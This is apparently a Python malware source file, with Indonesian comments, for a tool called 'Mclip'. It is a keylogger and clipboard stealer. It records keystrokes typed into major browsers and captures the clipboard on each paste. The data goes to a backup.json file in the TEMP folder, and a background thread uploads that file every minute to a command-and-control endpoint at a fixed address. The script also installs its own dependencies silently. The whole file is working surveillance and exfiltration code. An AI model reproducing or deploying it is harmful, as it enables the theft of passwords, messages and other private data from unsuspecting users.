import os
import sys
import subprocess
import threading
import time

# Konfigurasi C2
C2_HOST = "http://192.168.0.29:1224"
C2_UPLOAD_URL = f"{C2_HOST}/api/clip"
UPLOAD_INTERVAL = 60  # Interval pengiriman ke C2 (1 menit dalam detik)

# Tentukan direktori TEMP berdasarkan OS
TEMP_DIR = os.environ.get("TEMP", os.environ.get("TMPDIR", "/tmp"))
BACKUP_FILE = os.path.join(TEMP_DIR, "backup.json")

# Token autentikasi (opsional, uncomment jika diperlukan)
# AUTH_TOKEN = "YOUR_SECRET_TOKEN"

# Fungsi untuk menginstal library yang hilang
def install_library(library_name, pip_name=None):
    try:
        __import__(library_name)
        print(f"[+] {library_name} sudah terinstal")
        return True
    except ImportError:
        pip_name = pip_name or library_name
        print(f"[*] {library_name} tidak ditemukan, mencoba menginstal...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
            print(f"[+] Berhasil menginstal {pip_name}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[-] Gagal menginstal {pip_name}: {e}")
            return False

# Fungsi untuk memastikan semua dependensi terinstal
def ensure_dependencies():
    required_libraries = [
        ("requests", "requests"),
        ("pyperclip", "pyperclip"),
        ("keyboard", "keyboard")
    ]

    all_installed = True
    for lib_name, pip_name in required_libraries:
        if not install_library(lib_name, pip_name):
            all_installed = False

    if all_installed:
        # Impor library setelah instalasi berhasil
        global socket, pyperclip, keyboard, requests, json
        import socket
        import pyperclip
        import keyboard
        import requests
        import json
        print("[+] Semua dependensi berhasil diimpor")
        return True
    else:
        print("[-] Beberapa dependensi gagal diinstal, kode tidak dapat berjalan")
        return False

# Inisialisasi data log setelah dependensi diimpor
def initialize_log_data():
    return {
        "gid": "sType",
        "pid": "gType",
        "pcname": socket.gethostname(),
        "entries": []
    }

def act_win_pn():
    # Simulasi mendapatkan jendela aktif
    return (1234, "chrome.exe", "Google Chrome")

def browserList(text):
    # Periksa apakah proses berada dalam daftar target browser
    target_browsers = ["chrome.exe", "brave.exe", "firefox.exe", "safari.exe", "msedge.exe"]
    return text.lower() in target_browsers

def GetTextFromClipboard():
    try:
        return pyperclip.paste()
    except Exception as e:
        print(f"[-] Error mendapatkan clipboard: {e}")
        return ""

def save_to_file(log_entry, log_data):
    # Tambahkan entri baru ke log_data
    log_data["entries"].append(log_entry)

    # Simpan ke file backup.json
    try:
        with open(BACKUP_FILE, "w") as f:
            json.dump(log_data, f, indent=4)
        print(f"[+] Log disimpan ke {BACKUP_FILE}")
    except Exception as e:
        print(f"[-] Error menyimpan ke {BACKUP_FILE}: {e}")

def upload_to_c2():
    while True:
        try:
            if os.path.exists(BACKUP_FILE):
                with open(BACKUP_FILE, "rb") as f:
                    headers = {
                        "Content-Type": "application/json",
                        # "Authorization": f"Bearer {AUTH_TOKEN}"  # Uncomment jika token diperlukan
                    }
                    response = requests.post(C2_UPLOAD_URL, data=f.read(), headers=headers)
                    if response.status_code == 200:
                        print(f"[+] Backup.json berhasil diunggah ke C2: {response.text}")
                    else:
                        print(f"[-] Gagal mengunggah backup.json: Status {response.status_code}")
            else:
                print(f"[-] File {BACKUP_FILE} tidak ditemukan")
        except requests.exceptions.RequestException as e:
            print(f"[-] Error saat mengunggah ke C2: {e}")

        # Tunggu 1 menit sebelum upload berikutnya
        time.sleep(UPLOAD_INTERVAL)

def OnKeyboardEvent(event, log_data):
    (pid, text, caption) = act_win_pn()
    if browserList(text):
        key = event.name

        if keyboard.is_pressed('ctrl'):
            key = f"<{event.name}>"
        elif key == 'enter':
            key = "\n"
        elif len(key) == 1:
            key = key
        else:
            key = f"<{event.name}>"

        if keyboard.is_pressed('ctrl') and event.name.lower() == 'v':
            key += GetTextFromClipboard()

        # Buat entri log
        log_entry = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "processname": text,
            "windowname": caption,
            "data": key
        }

        # Simpan entri ke file
        save_to_file(log_entry, log_data)

    return True

def main():
    print("[*] Mclip dimulai...")

    # Pastikan direktori TEMP ada
    if not os.path.exists(TEMP_DIR):
        os.makedirs(TEMP_DIR)

    # Inisialisasi log_data
    log_data = initialize_log_data()

    # Mulai thread untuk upload berkala ke C2
    upload_thread = threading.Thread(target=upload_to_c2, daemon=True)
    upload_thread.start()

    # Mulai pemantauan keyboard
    keyboard.on_press(lambda event: OnKeyboardEvent(event, log_data))
    keyboard.wait()

if __name__ == "__main__":
    # Langkah pertama: Pastikan semua dependensi terinstal
    if ensure_dependencies():
        # Jalankan kode utama jika semua dependensi tersedia
        main()
    else:
        print("[-] Gagal menjalankan Mclip karena dependensi tidak lengkap")